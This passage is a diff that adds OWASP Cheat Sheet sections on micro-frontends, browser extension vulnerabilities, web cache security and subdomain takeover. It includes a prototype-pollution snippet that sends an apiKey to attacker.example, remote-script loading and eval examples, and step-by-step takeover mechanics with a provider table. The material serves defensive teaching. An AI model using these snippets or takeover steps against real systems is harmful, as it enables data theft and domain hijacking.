+Without `allow-same-origin`, a sandboxed document has an opaque origin, reported as `"null"` in messages. Do not trust `"null"` as a sender identity. If sensitive messaging requires an identifiable origin, use a dedicated cross-origin frame with a sandbox policy that preserves that origin.
+
+Origin separation limits direct access to the host's DOM and storage. It does not authorize backend requests or make data deliberately sent to the frame confidential from that frame.
+
+#### Control Remote Code and Deployments
+
+For remotes executing in the host page, treat permission to publish a remote as permission to change the host's running application:
+
+- Load only approved HTTPS remote URLs from host-controlled configuration. Do not let query parameters or other untrusted input choose executable code.
+- Select immutable, reviewed releases, including entry scripts and their dependent chunks. Keep a known-good release available for rollback.
+- Separate deployment credentials for the shell and each remote. This limits direct changes to other deployments, but does not contain a compromised remote already trusted to execute in the shell. See the [CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html).
+- Use [Subresource Integrity](https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#subresource-integrity) where the loader supports it. Verify coverage of dynamically loaded chunks; checking an entry script alone does not verify everything it later loads. Integrity checks detect changed bytes, not malicious behavior in an approved release.
+- Apply the host's [Content Security Policy (CSP)](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) to remote loading. A permitted script source is still trusted code; CSP does not isolate one allowed micro-frontend from another.
+
+### Restrict Cross-Application Communication
+
+Apply the general [web messaging guidance](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging) to every host/frame pair: set an exact `targetOrigin`, match `event.origin` exactly, and validate message data. In addition, following the [postMessage security guidance](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns):
+
+- Define a small message contract for each pair. Accept only the message types and payload fields that the receiving feature needs.
+- Check `event.source` against the expected frame's `contentWindow` or the expected parent window, not only the origin. Several frames can share one origin.
+- Pass the minimum data needed for the operation. Avoid broadcasting credentials or sensitive state to every feature.
+
+These checks identify the sending origin and window, not the current user's permissions. A message requesting a privileged operation must still lead to server-side authorization. They also do not protect against compromised code running inside the expected sender.
+
+A shared in-page event bus has no browser-enforced identity boundary between its participants. Do not use event names or application identifiers as proof of authority.
+
+### Enforce Backend Authorization and Limit Shared Data
+
+#### Authorize Every Request on the Server
+
+Neither the shell nor a remote micro-frontend can enforce authorization in client-side code. Route guards, hidden controls, and client-side role checks only affect presentation and can be bypassed.
+
+Enforce permissions for the requested operation, resource, and tenant on every backend request, regardless of which frontend initiated it. Do not trust a role, tenant identifier, or permission flag supplied by the shell or a remote. Use a shared server-side policy where appropriate so independently developed features apply consistent checks. See the [Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html#validate-the-permissions-on-every-request).
+
+#### Keep Sensitive State Out of Shared Runtimes
+
+Browser storage is [separated by origin](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy#cross-origin_data_storage_access). Storage key prefixes, separate state stores, and component boundaries do not provide security isolation between scripts in the same page. Treat data exposed in the page or origin storage as available to every remote executing there.
+
+Keep session identifiers out of `localStorage` and `sessionStorage`. When using a backend-for-frontend, keep upstream access tokens on the server and use a session cookie configured according to the [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies). An `HttpOnly` cookie prevents JavaScript from reading the cookie, but compromised code in the host can still make authenticated requests. Apply [cross-site request forgery protection](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) to cookie-authenticated operations.
+
+Return only data the authenticated user is authorized to access. Clear shared state and cached responses on logout or tenant changes to avoid displaying stale data. This cleanup does not replace backend tenant checks or protect information already exposed to a compromised remote.
+
 ## Third Party JavaScript Management
 
 > **Source:** [Third Party JavaScript Management](https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
@@ -2898,6 +4982,699 @@ The most complete and preventive controls for any site containing non-trivial ma
 3. Virtual frame Containment.
 
 The MarSecOps requirements to implement technical controls at the speed of change that marketing wants or without a significant number of dedicated resources, can make data layer and Subresource Integrity controls impractical.
+
+## Browser Extension Security Vulnerabilities
+
+> **Source:** [Browser Extension Security Vulnerabilities](https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### 1. Permissions Overreach
+
+#### Vulnerability: Permissions Overreach
+
+Browser extensions sometimes request more permissions than they actually need. This can grant them access to all tabs, browsing history, and even sensitive user data. If an extension is compromised, it could lead to serious privacy risks.
+
+#### Example: Permissions Overreach
+
+```json
+{
+  "manifest_version": 3,
+  "name": "My Extension",
+  "permissions": [
+    "tabs",
+    "storage"
+  ],
+  "host_permissions": [
+    "http://*/*",
+    "https://*/*"
+  ]
+}
+```
+
+#### Mitigation: Permissions Overreach
+
+Follow the Principle of Least Privilege (PoLP) and request only the permissions that are absolutely necessary. Use optional permissions whenever possible instead of granting full access upfront. Regularly audit and remove any permissions that are no longer needed. In Manifest V3, declare URL access separately in [`host_permissions` or `optional_host_permissions`](https://developer.chrome.com/docs/extensions/develop/migrate/manifest#update-host-permissions).
+
+### 2. Data Leakage
+
+#### Vulnerability: Data Leakage
+
+Some extensions unintentionally expose user data by sending browsing activity or personal details to external servers without proper security measures.
+
+#### Example: Data Leakage
+
+```javascript
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status === 'complete') {
+    fetch('http://example.com/track', {
+      method: 'POST',
+      body: JSON.stringify({ URL: tab.URL })
+    });
+  }
+});
+```
+
+#### Mitigation: Data Leakage
+
+Always use HTTPS for all communications to prevent data interception. Limit data collection and be transparent by clearly stating what data is collected in a Privacy Policy.Implement user consent mechanisms before collecting or sending any personal data.
+
+### 3. Cross-Site Scripting (XSS)
+
+#### Vulnerability: Cross-Site Scripting (XSS)
+
+If user input is not properly sanitized, attackers can inject malicious scripts into web pages, potentially stealing user data or performing unauthorized actions.
+
+#### Example: Cross-Site Scripting (XSS)
+
+```javascript
+let userInput = document.getElementById('input').value;
+document.getElementById('output').innerHTML = userInput; // No sanitization
+```
+
+#### Mitigation: Cross-Site Scripting (XSS)
+
+Implement Content Security Policy (CSP) to block inline scripts. Use libraries like DOMPurify to sanitize user input before displaying it. Avoid using innerHTML and instead use textContent to prevent execution of injected scripts.
+
+### 4. Insecure Communication
+
+#### Vulnerability: Insecure Communication
+
+Some extensions send sensitive data over unsecured HTTP connections, making it vulnerable to interception by attackers.
+
+#### Example: Insecure Communication
+
+```javascript
+fetch('http://example.com/api/data');
+```
+
+#### Mitigation: Insecure Communication
+
+Always use HTTPS for external communications to prevent data theft. Validate server responses before processing them to ensure data integrity.
+
+### 5. Code Injection
+
+#### Vulnerability: Code Injection
+
+An extension that dynamically loads scripts from an untrusted source can be exploited to inject and execute malicious code.
+
+#### Example: Code Injection
+
+```javascript
+let script = document.createElement('script');
+script.src = 'http://example.com/malicious.js';
+document.body.appendChild(script);
+```
+
+#### Mitigation: Code Injection
+
+Use CSP (Content Security Policy) to restrict script sources. For more details, refer to the [CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html). Avoid using eval() and innerHTML as they can execute malicious code. Prefer using extension messaging APIs instead of injecting scripts into web pages.
+
+### 6. Malicious Updates
+
+#### Vulnerability: Malicious Updates
+
+If an extension fetches updates from an untrusted server, an attacker could push malicious updates to all users.
+
+#### Example: Malicious Updates
+
+```javascript
+chrome.runtime.onInstalled.addListener(() => {
+  fetch('http://example.com/update-script.js')
+    .then(response => response.text())
+    .then(eval); // Unsafe!
+});
+```
+
+#### Mitigation: Malicious Updates
+
+Sign extension updates with digital signatures to ensure authenticity. Instead of fetching updates within the extension, rely on updates from the extension marketplace.
+See ["Don’t inject or incorporate remote scripts"](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices).
+Implement integrity checks before executing any fetched code.
+
+### 7. Third-Party Dependencies
+
+#### Vulnerability: Third-Party Dependencies
+
+Using outdated or vulnerable third-party libraries in an extension can introduce security risks if those libraries have known exploits.
+
+#### Example: Third-Party Dependencies
+
+```json
+{
+  "dependencies": {
+    "vulnerable-lib": "1.0.0"
+  }
+}
+```
+
+#### Mitigation: Third-Party Dependencies
+
+Regularly audit third-party dependencies for security vulnerabilities. Use tools like npm audit or OWASP Dependency-Check to detect risks.Prefer actively maintained libraries with frequent security updates.
+
+### 8. Lack of Content Security Policy (CSP)
+
+#### Vulnerability: Lack of Content Security Policy (CSP)
+
+Weakening an extension’s Content Security Policy (CSP) can increase the impact of script injection. [Chrome enforces a default and minimum CSP for Manifest V3 extension pages](https://developer.chrome.com/docs/extensions/reference/manifest/content-security-policy), even when the manifest omits a custom policy.
+
+#### Example: Restrictive Manifest V3 Policy
+
+```json
+{
+  "manifest_version": 3,
+  "name": "My Extension",
+  "content_security_policy": {
+    "extension_pages": "default-src 'self'; script-src 'self'; object-src 'none';"
+  }
+}
+```
+
+#### Mitigation: Lack of Content Security Policy (CSP)
+
+Configure `content_security_policy.extension_pages` in `manifest.json` and load scripts from the extension package. Do not apply ordinary webpage nonce or hash recommendations to Chrome Manifest V3 extension pages: their [allowed script sources are restricted](https://developer.chrome.com/docs/extensions/develop/migrate/improve-security#remove-unsupported-csv). Keep inline script execution blocked and restrict other resource types to those the extension needs.
+
+### 9. Insecure Storage
+
+#### Vulnerability: Insecure Storage
+
+Storing sensitive data like authentication tokens in localStorage or other unsecured locations makes it easy for attackers to access.
+
+#### Example: Insecure Storage
+
+```javascript
+localStorage.setItem('token', 'my-secret-token'); // No encryption
+```
+
+#### Mitigation: Insecure Storage
+
+Avoid persisting sensitive user data in the extension: [extension storage is not encrypted](https://developer.chrome.com/docs/extensions/develop/security-privacy/user-privacy#data_collection). For sensitive data needed only while the browser is running, use [`chrome.storage.session`](https://developer.chrome.com/docs/extensions/reference/api/storage#storage_areas), which stores data in memory and is not exposed to content scripts by default. Keep that access restriction and clear data when it is no longer needed. This reduces persistence and content-script exposure; it does not protect secrets from a compromised extension or device.
+Never hardcode API keys or credentials within the extension code.
+
+### 10. Insufficient Privacy Controls
+
+#### Vulnerability: Insufficient Privacy Controls
+
+If an extension does not clearly define how it collects and handles user data, it could lead to privacy violations and unauthorized data usage.
+
+#### Example: Insufficient Privacy Controls
+
+```json
+{
+  "manifest_version": 3,
+  "name": "My Extension",
+  "description": "A cool extension with no privacy policy."
+}
+```
+
+#### Mitigation: Insufficient Privacy Controls
+
+Implement a clear privacy policy that explains data collection practices. Allow users to opt out of data collection. Disclose data-sharing practices to comply with GDPR, CCPA, and other privacy regulations.
+
+### 11. DOM-based Data Skimming
+
+#### Vulnerability: DOM-based Data Skimming
+
+When an extension renders sensitive user information directly into DOM of a web page, this data becomes accessible to the page's own scripts.
+
+This risk applies regardless of the method used, including plain JavaScript DOM manipulation or injecting components built with frameworks like React.
+
+A malicious or compromised web page can inspect the DOM, read the sensitive data (e.g., personally identifiable information, financial details, AI chat histories), and exfiltrate it.
+
+#### Example: DOM-based Data Skimming
+
+```javascript
+// content-script.js
+
+// Sensitive data fetched from the extension's background service
+const userData = {
+  name: "Jane Doe",
+  email: "jane.doe@example.com"
+};
+
+// This injects sensitive data directly into the page's DOM
+const userInfoDiv = document.createElement('div');
+userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
+document.body.appendChild(userInfoDiv);
+```
+
+#### Mitigation: DOM-based Data Skimming
+
+Avoid rendering any sensitive information directly into a web page's DOM. Instead, display sensitive data in UI elements that are isolated from the web page's context and controlled by the extension.
+
+Use secure alternatives such as:
+
+- Popup: Display information in a popup UI that appears when the user clicks the extension's icon.
+- Options Page: Use a dedicated options page for displaying user-specific data or settings.
+- Side Panel: Use the side panel to show a persistent UI in a separate pane, isolated from the page content. (FYI, "Side Panel" is a Chromium term. Firefox calls it "Sidebar".)
+
+It is important to note that even using a Shadow DOM for encapsulation may not be a sufficient safeguard, as page scripts can still query an 'open' Shadow DOM. Moreover, even a 'closed' Shadow DOM is not safe, if you consider other browser extensions as threats under your security model. This is because extensions can spear through a 'closed' Shadow DOM using [`openOrClosedShadowRoot()` API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dom/openOrClosedShadowRoot).
+
+Therefore, using truly separate extension-controlled UIs is the most reliable mitigation.
+
+### 12. Prototype-based Data Skimming
+
+#### Vulnerability: Prototype-based Data Skimming
+
+An extension's content script is executed in "isolated world", a JavaScript context separated from the one of a web page. On the other hand, there are some ways for an extension to execute scripts in "main world", a web page's context. For example, an extension can inject a `<script>` tag directly to DOM with `src` attribute pointing to a script of [web accessible resources](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources).
+
+When an extension uses sensitive user information in any scripts executed on the web page's context, the data becomes accessible to the page's scripts. So, if the web page is compromised or malicious, the data will be stolen.
+
+The reason why the data becomes accessible is because global objects of a context (sometimes called "built-in objects", "primordials" or "prototypes") can be overwritten to behave differently than usual. This is known as "prototype pollution", "prototype overriding" and so on.
+
+This means that a malicious or compromised webpage can overwrite global objects in its context to steal any data they handle. Please note that objects here include almost everything in the context such as functions. So, if the extension's injected script uses these overwritten objects with sensitive data, it will inadvertently trigger the malicious code, leading to the exfiltration of that data.
+
+#### Example: Prototype-based Data Skimming
+
+```javascript
+// Malicious script overwriting all objects' setter for 'apiKey'
+// to send the value to be set towards a server.
+Object.defineProperty(Object.prototype, 'apiKey', {
+    set: function (str) {
+        fetch(`https://attacker.example?data=${str}`);
+        Object.defineProperty(this, 'apiKey', {
+            value: str
+        })
+        return str
+    }
+})
+
+// Extension's script to be executed on a web page's context.
+window.addEventListener('message', (data) => {
+  if (data.apiKey) {
+    // the setter for 'apiKey' is already polluted,
+    // and the below line triggers malicious code and the data is immediately sent.
+    window.apiController.apiKey = data.apiKey;
+  }
+})
+```
+
+#### Mitigation: Prototype-based Data Skimming
+
+Please don't use the web page's context when sensitive user information is handled just for a moment. If communication with scripts in the web page's context is necessary, use only non-sensitive, essential information. For example, pass just a result of validation instead of the whole secret token. It's the case even if you use `window.postMessage`, because it can be overwritten also and malicious scripts can add listeners for `message` event.
+
+Please note that it's not recommended to try to get native (not-overwritten) prototypes by some tricks. It's sure that there are some hacks to get native prototypes in a context where other scripts are also executed, but bypasses of these measures, i.e. how to force other scripts to use overwritten prototypes, are often invented.
+
+Also, please don't assume your extension's script can use native prototypes even if it's executed at `document_start` timing. At least, in the case of Chromium browser extension, it's known that the context of a newly created iframe can be tweaked by a web page's script BEFORE the extension's script starts in the iframe event at `document_start` ([official bug issue](https://issues.chromium.org/issues/40202434)).
+
+### 13. Insecure Message Passing
+
+#### Vulnerability: Insecure Message Passing
+
+Browser extensions often rely on message passing (`chrome.runtime.sendMessage/onMessage`) between low-privilege contexts (Content Scripts, Popup) and the high-privilege Service Worker (Background). If the Service Worker fails to validate the sender's origin or URL, a compromised webpage can send malicious messages, tricking the extension into performing privileged actions (e.g., retrieving sensitive data or API keys).
+
+#### Example: Insecure Message Passing
+
+```javascript
+// In Service Worker (Background)
+chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+  if (request.action === 'fetchSecret') { // No validation of sender
+    // A malicious content script/webpage could trigger this.
+    fetch(SECRET_API_URL);
+  }
+});
+```
+
+#### Mitigation: Insecure Message Passing
+
+Treat all incoming messages as untrusted input.
+In Service Workers, always:
+
+- Validate `sender.id` to ensure the message originates from your own extension.
+- Validate `sender.url` or `sender.origin` to restrict which extension pages or content scripts may communicate.
+- Avoid allowing webpages to indirectly influence privileged logic through content scripts.
+- Perform strict validation and allow-listing of `request.action` and all request parameters.
+
+Chrome explicitly states that content scripts are less trustworthy than extension pages and must be treated accordingly. Secure example:
+
+```javascript
+chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+  if (sender.id !== chrome.runtime.id) return;
+  if (!sender.url?.startsWith('chrome-extension://')) return;
+
+  if (request.action === 'fetchSecret') {
+    fetch(SECRET_API_URL);
+  }
+});
+```
+
+## Web Cache Security
+
+> **Source:** [Web Cache Security](https://cheatsheetseries.owasp.org/cheatsheets/Web_Cache_Security_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+HTTP caches improve performance by reusing stored responses in browsers, reverse proxies, content delivery networks (CDNs), and application data stores. A cache becomes a security boundary when it serves a response to a request other than the one that originally produced it. The [HTTP caching specification](https://www.rfc-editor.org/rfc/rfc9111.html) defines the behavior of private and shared caches, while the [MDN HTTP caching guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching) provides practical examples of common directives.
+
+This cheat sheet focuses on preventing sensitive data exposure, web cache poisoning, web cache deception, and cross-tenant data leakage. It applies to developers and operators configuring origin applications, reverse proxies, CDNs, and application-level caches.
+
+### Key Risks
+
+The [security considerations in RFC 9111](https://www.rfc-editor.org/rfc/rfc9111.html#name-security-considerations) describe caches as attractive attack targets because one stored response can affect many users. [OWASP's cache poisoning overview](https://owasp.org/www-community/attacks/Cache_Poisoning) also explains how a harmful cached response can be distributed to other visitors.
+
+- **Sensitive response exposure**: A shared cache stores a personalized or authenticated response and returns it to another user.
+- **Web cache poisoning**: An attacker-controlled request input changes a response but is excluded from the cache key. The harmful response is then served to other users.
+- **Web cache deception**: A dynamic or personalized URL is made to look like a static asset, causing an intermediary to cache sensitive content.
+- **Cache key confusion**: The cache and origin disagree about URL normalization, query parameters, headers, or request routing, causing unrelated requests to share an entry.
+- **Cross-tenant leakage**: An application cache omits the tenant or authorization context from its key.
+- **Stale security state**: Cached content remains accessible after permissions, account state, or the underlying resource changes.
+
+### Best Practices
+
+Treat cacheability and cache-key design as part of the application's authorization model. [RFC 9111](https://www.rfc-editor.org/rfc/rfc9111.html) specifies how response directives, request inputs, and validation control whether a stored response can be reused.
+
+#### 1. Classify Responses Before Caching
+
+Define an explicit policy for every route. Default to preventing shared caching for authenticated, personalized, tenant-specific, or otherwise sensitive responses.
+
+- Use `Cache-Control: no-store` when a response must not be stored by any compliant cache.
+- Use `Cache-Control: private` when a response may be stored by a user's private cache but not by a shared cache.
+- Remember that `no-cache` permits storage but requires successful validation before reuse. It does not mean "do not store."
+- Do not assume that cookies make a response private. A `Set-Cookie` header alone does not prevent caching.
+- Do not mark a response influenced by `Authorization` or session cookies as `public`, or give it an `s-maxage`, unless sharing the response has been deliberately designed and reviewed.
+- Purge previously stored entries when changing a route to `no-store`; the directive does not delete old entries.
+
+For a response containing sensitive data:
+
+```http
+Cache-Control: no-store
+```
+
+For non-sensitive content that may be stored only in a private cache and must be revalidated:
+
+```http
+Cache-Control: private, no-cache
+```
+
+#### 2. Design a Complete Cache Key
+
+Every request input that can change a cacheable response must either be represented in the cache key or be rejected for that route.
+
+- Include the request method, scheme, host, normalized path, and all relevant query parameters.
+- Use [`Vary`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Vary) for representation-selecting headers such as `Accept-Encoding` or `Accept-Language`.
+- Do not use `Vary: Cookie` as a general authorization boundary. Prefer disabling shared caching for personalized responses.
+- Derive tenant and user identifiers from trusted, authenticated server-side context, not directly from an untrusted header or query parameter.
+- Apply the same URL normalization and parameter handling at the CDN, reverse proxy, and origin.
+- Reject ambiguous requests, including conflicting host information, duplicate parameters with inconsistent meanings, and malformed path encodings.
+
+For an application-level cache, use a structured, versioned key:
+
+```text
+<environment>:<resource-version>:<tenant-id>:<resource-type>:<resource-id>
+```
+
+Do not put session tokens, API keys, or other secrets in cache keys because keys often appear in logs and administrative interfaces.
+
+#### 3. Prevent Web Cache Poisoning
+
+[Cloudflare's cache poisoning guidance](https://developers.cloudflare.com/cache/cache-security/avoid-web-poisoning/) describes the central design rule: untrusted request inputs that are not part of the cache key must not influence a cacheable response.
+
+- Cache only routes that are explicitly intended to be shared.
+- Do not let unkeyed headers or a body on a `GET` request alter a cacheable response.
+- Trust `Forwarded` and `X-Forwarded-*` headers only when they were added or replaced by a trusted proxy.
+- Canonicalize the host and scheme before using them to generate links, redirects, or security-sensitive headers.
+- Do not reflect unvalidated request metadata into cached HTML, JSON, redirects, or response headers.
+- Separate static assets and dynamic application routes by hostname or an unambiguous path namespace where practical.
+- If poisoning occurs, purge every affected cache layer and fix the key or origin behavior before re-enabling caching.
+
+#### 4. Prevent Web Cache Deception
+
+Web cache deception occurs when an attacker causes a shared cache to store personalized content under a URL that appears cacheable. [Cache Deception Armor](https://developers.cloudflare.com/cache/cache-security/cache-deception-armor/) documents one mitigation: verifying that the requested file extension agrees with the response `Content-Type`.
+
+- Base cache eligibility on an allowlisted route and response policy, not only on a file extension.
+- Make dynamic routes reject unexpected path segments and static-looking suffixes instead of silently routing them to the same handler.
+- Ensure that a request such as `/account/profile/image.css` cannot resolve to the same personalized handler as `/account/profile`.
+- Verify that the URL extension and response `Content-Type` agree before caching a static asset.
+- Ignore or remove query parameters from a cache key only after proving that they cannot change routing, authorization, or response content.
+
+#### 5. Coordinate Origin and Intermediary Policies
+
+A secure origin policy can be weakened by a CDN rule, reverse proxy override, or framework default. [MDN's caching guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching) recommends explicitly controlling caching rather than relying on heuristic behavior.
+
+- Define browser and shared-cache lifetimes independently with the appropriate directives.
+- Review CDN rules that override origin `Cache-Control` headers or cache responses by status code, path pattern, or file extension.
+- Give error pages, redirects, and authentication responses explicit cache policies.
+- Use consistent URL normalization at every layer. When a CDN normalizes its cache key, send the normalized form to the origin as well.
+- Maintain a tested purge mechanism for individual keys, tags, or narrowly scoped route groups.
+- Fail closed when a sensitive route has a missing, malformed, or conflicting cache policy.
+
+#### 6. Protect Application-Level Caches
+
+In-memory, database, and distributed caches can leak data even when HTTP caching is disabled. Authorization must still be enforced on every request before cached data is returned. See the [Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html) and [Multi-Tenant Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multi_Tenant_Security_Cheat_Sheet.html) for related controls.
+
+- Namespace keys by environment and application to prevent collisions.
+- Include tenant identity and every authorization-relevant resource dimension in the key.
+- Do not let a cache hit bypass object-level or tenant-level authorization.
+- Avoid caching final authorization decisions unless the key includes the complete subject, object, action, policy version, and a tightly bounded lifetime.
+- Version key formats so schema or permission-model changes cannot reuse incompatible entries.
+- Restrict administrative access to cache contents, configuration, statistics, and purge operations.
+
+#### 7. Test the Complete Cache Path
+
+Test through the same CDN and proxy path used in production. The [Cloudflare cache-key documentation](https://developers.cloudflare.com/cache/how-to/cache-keys/) illustrates how scheme, host, path, query parameters, headers, and cookies can contribute to a cache key.
+
+- Request the same URL as two different users and tenants; neither response may contain the other's data.
+- Change one header, query parameter, cookie, or path component at a time and verify the expected cache behavior.
+- Append static-looking suffixes and unexpected path segments to authenticated routes and verify that they are rejected and not cached.
+- Test authorization changes, logout, content updates, and purge operations against already stored entries.
+- Monitor for unexpected cache hits on authenticated routes, abrupt hit-ratio changes, unusual forwarded headers, and repeated purge activity.
+- Log enough cache-status and routing metadata to investigate incidents, but never log secrets or full sensitive response bodies.
+
+### Do's and Don'ts
+
+Use these checks alongside the [HTTP caching requirements in RFC 9111](https://www.rfc-editor.org/rfc/rfc9111.html) and the application's normal authorization review.
+
+**Do:**
+
+- Set an explicit `Cache-Control` policy on every security-relevant response.
+- Verify that every response-changing input is included in the cache key or rejected.
+- Keep cache and origin routing rules consistent.
+- Authorize the current request before returning cached application data.
+- Test with multiple identities and tenants through the production caching path.
+- Plan and test targeted cache invalidation before an incident occurs.
+
+**Don't:**
+
+- Assume that authentication, cookies, TLS, or `Set-Cookie` automatically prevents caching.
+- Cache every URL with a static-looking extension.
+- Allow unkeyed request metadata to influence shared responses.
+- Treat `Vary: Cookie` as a substitute for an authorization design.
+- Include credentials or session identifiers in keys, logs, or purge URLs.
+- Assume that purging a poisoned entry fixes the underlying vulnerability.
+
+## Subdomain Takeover Prevention
+
+> **Source:** [Subdomain Takeover Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Subdomain_Takeover_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+Subdomain takeover is a vulnerability that occurs when a DNS record (typically a CNAME) points to a cloud resource or third-party service that has been deprovisioned or no longer exists. An attacker can claim the orphaned resource and serve arbitrary content on the victim's subdomain.
+
+This vulnerability is consistently among the most reported findings in bug bounty programs. Despite being well understood, it remains prevalent because it is fundamentally an operational problem: teams create DNS records when spinning up services but rarely have processes to clean them up during decommissioning.
+
+The impact extends far beyond serving a defacement page. An attacker controlling a subdomain can:
+
+- **Steal session cookies** scoped to the parent domain (e.g., cookies set on `.example.com` are sent to `attacker-controlled.example.com`)
+- **Bypass Content Security Policy** rules that trust wildcard subdomains (`*.example.com`)
+- **Host convincing phishing pages** on a domain the organization's users and customers already trust
+- **Compromise OAuth and SSO flows** that whitelist the subdomain as a valid redirect URI
+- **Obtain valid TLS certificates** for the subdomain from Certificate Authorities that use HTTP or email-based domain validation
+- **Receive email** addressed to the subdomain if MX records are involved, enabling password resets or account verification on third-party services
+
+This cheat sheet provides practical guidance for developers, DevOps engineers, and infrastructure teams to prevent subdomain takeovers, detect dangling records before attackers do, and respond effectively when they are discovered.
+
+### How Subdomain Takeover Works
+
+#### The Basic Mechanism
+
+1. An organization creates a DNS record: `blog.example.com CNAME example-blog.herokuapp.com`
+2. The Heroku app serves content on `blog.example.com`
+3. Months later, the team decommissions the Heroku app but forgets to remove the DNS record
+4. The CNAME still points to `example-blog.herokuapp.com`, which no longer exists
+5. An attacker creates a new Heroku app with the name `example-blog` and claims the hostname
+6. The attacker now controls what is served on `blog.example.com`
+
+#### Why It Keeps Happening
+
+The root cause is almost always a disconnect between infrastructure provisioning and DNS management:
+
+- **Cloud resources are temporary, DNS records are persistent.** Teams spin up and tear down services frequently, but DNS records tend to accumulate unless explicitly managed.
+- **Different teams own different parts.** The team that created the cloud resource may not have access to DNS management, and the team that manages DNS may not know the resource was removed.
+- **No automated link between resources and DNS.** Most organizations have no mechanism to detect when a DNS target stops existing.
+- **Shadow IT and forgotten proof-of-concepts.** Developers create temporary subdomains for testing or demos and never clean them up.
+- **Mergers, acquisitions, and reorganizations.** DNS zones inherited from acquired companies are often poorly inventoried, and the original infrastructure owners are no longer available.
+
+#### Record Types at Risk
+
+- **CNAME records** are the most common vector. If the canonical name resolves to a service that can be claimed, takeover is possible.
+- **A records** pointing to released IP addresses can be vulnerable if the IP is reassigned and the attacker obtains it. This is common in cloud environments where elastic IPs are released back to the provider's pool.
+- **NS records** delegating a subdomain to a third-party DNS provider are particularly dangerous. If the account at the DNS provider is closed, anyone who creates a new account can potentially claim the delegated zone and control all records under that subdomain.
+- **MX records** pointing to deprovisioned mail services can allow an attacker to receive email for the subdomain. Beyond intercepting password reset emails, this enables a more severe attack: most Certificate Authorities accept email-based domain validation (DV) using addresses like `admin@subdomain.example.com`. An attacker controlling MX records can complete DV challenges and obtain legitimate TLS certificates for the subdomain, enabling transparent HTTPS phishing or man-in-the-middle attacks.
+
+### Cloud Provider Vulnerability Reference
+
+Not all cloud services are equally vulnerable. The key factor is whether the service allows a new customer to claim a previously used hostname or resource name. This table is a snapshot; cloud providers continuously update their policies, so always verify current behavior against the community-maintained [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) repository.
+
+#### High Risk: Takeover Possible When Resource Is Removed
+
+| Provider/Service | Vulnerable Resource | Indicator (CNAME Target) | Takeover Mechanism |
+|---|---|---|---|
+| AWS S3 (Website Hosting) | S3 bucket | `*.s3.amazonaws.com`, `*.s3-website-*.amazonaws.com` | Bucket names are globally unique across all AWS accounts. If a bucket is deleted, any AWS account can recreate it with the same name and serve content on the CNAME. |
+| AWS Elastic Beanstalk | Environment | `*.elasticbeanstalk.com` | Environment CNAMEs are globally unique and released on environment termination. An attacker can create a new environment with the same CNAME prefix. |
+| Azure App Service | Web App | `*.azurewebsites.net` | App names are globally unique. After deletion, any Azure tenant can create a new app with the same name. Azure offers a [domain verification mechanism](https://learn.microsoft.com/en-us/azure/app-service/app-service-web-tutorial-custom-domain) to mitigate this; see Prevention Strategies. |
+| Azure Traffic Manager | Profile | `*.trafficmanager.net` | Profile names are globally unique and reclaimable after deletion. |
+| Azure CDN | Endpoint | `*.azureedge.net` | Endpoint names are globally unique. A deleted endpoint name can be registered by another tenant. |
+| GitHub Pages (Custom Domains) | Unverified custom domain | `*.github.io` | Takeover can occur when a domain still points to GitHub Pages after its repository is deleted or Pages is disabled, and the domain is not verified. [Account or organization domain verification](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/verifying-your-custom-domain-for-github-pages) prevents other GitHub users from publishing to the verified domain and its immediate subdomains. |
+| Heroku | App | `*.herokuapp.com` | App names are globally unique and released on app deletion. Any Heroku account can claim the name. |
+| Shopify | Store | `shops.myshopify.com` | Custom domain associations can be claimed by any Shopify store. |
+| Netlify | Site | `*.netlify.app`, `*.netlify.com` | Site names are reclaimable after deletion. |
+| Fastly | CDN service | `*.fastly.net`, `*.global.ssl.fastly.net` | An attacker with a Fastly account can add the victim's domain to their own Fastly service configuration. |
+| Zendesk | Support portal | `*.zendesk.com` | Support portal subdomain names can be reclaimed by new Zendesk accounts. |
